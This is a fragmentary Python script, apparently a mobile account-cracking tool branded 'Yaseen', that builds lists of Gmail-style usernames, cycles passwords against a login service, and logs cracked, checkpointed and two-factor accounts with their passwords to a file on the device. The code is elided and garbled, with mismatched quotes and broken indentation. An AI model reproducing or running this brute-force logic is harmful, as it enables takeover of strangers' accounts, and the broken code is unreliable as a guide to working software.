...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/Yaseen-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=Yaseen-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .Yaseen')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.Yaseen','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Yaseen,'a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Yaseen'', 'r').read().splitlines()
     ...
     try:
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97YASEEN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                ...
                break
                     ...
                     #pass
                #else:
                    print('\r\033[1;91m[\033[1;97YASEEN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                    cpacc.append(acc)
                    open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                    break
            elif "two_factor" in response.text:
                print('\r\033[1;95m[\033[1;97YASEEN-2F\033[1;95m] \033[1;95m'+acc+' \033[1;95m•\033[1;95m '+pword+'   ')
                break
            else:
                continue
        loop += 1
